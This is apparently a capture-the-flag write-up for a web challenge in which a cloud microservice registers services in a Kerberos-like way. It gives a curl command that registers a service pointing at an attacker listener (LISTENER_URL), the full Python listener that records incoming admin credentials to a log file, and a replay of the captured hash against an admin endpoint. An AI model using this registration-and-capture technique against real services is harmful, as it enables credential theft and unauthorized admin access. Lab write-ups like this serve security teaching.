# Webrosting : 
## Imagine that Kerberos protocol was implemented for authenticating / registering a microservice in a cloud environment

the challenge is simple we register a service 
via curl command : ``` curl -X POST http://TARGET/register -d '{"service_name": "test", "service_url": "http://LISTENER_URL"}'```

we start an authentication listener : ```python3 authentication_listener.py```
```from http.server import HTTPServer , BaseHTTPRequestHandler
import json
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("simple-auth")

class AuthHandler(BaseHTTPRequestHandler):
    def _set_headers(self, code=200):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()

    def do_POST(self):
        if self.path != "/auth":
            self._set_headers(404)
            self.wfile.write(b'{"error":"not found"}')
            return

        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        try:
            data = json.loads(body.decode())
        except Exception:
            data = {"raw": body.decode(errors="replace")}

        logger.info("[auth-receiver] Received: %s", data)
        with open("captured_auths.log", "a") as fh:
            fh.write(f"{data}\n")

        self._set_headers(200)
        self.wfile.write(b'{"status":"ok"}')

    def do_GET(self):
        # simple landing page so GET / works
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"Auth receiver listening. POST /auth to send creds.\n")

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 4000), AuthHandler)
    logger.info("Serving on http://0.0.0.0:4000")
    server.serve_forever()
```
after capturing the credentials of the admin we try to 
access the endpoint of the service we registered :
```curl -X POST http://TARGET/admin -d 'username=admin' -d 'provided_hash=HASH'```
